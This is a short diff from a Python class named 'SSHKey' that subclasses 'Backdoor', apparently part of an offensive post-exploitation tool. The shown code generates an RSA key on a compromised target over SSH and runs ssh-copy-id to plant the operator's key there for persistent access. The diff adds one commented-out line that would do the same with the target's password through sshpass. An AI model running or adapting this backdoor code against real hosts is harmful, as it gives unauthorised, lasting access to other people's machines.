@@ -21,4 +21,5 @@ class SSHKey(Backdoor):
         print(GOOD + "Initializing backdoor...")
         target.ssh.exec_command("echo -e \"\n\n\n\" | ssh-keygen -t rsa")
         os.system("ssh-copy-id " + target.uname + "@" + target.hostname)
+        #os.system("sshpass -p %s ssh-copy-id %s@%s" % (t.pword, t.uname, t.hostname))
         print(GOOD + "Added SSH keys to target.")
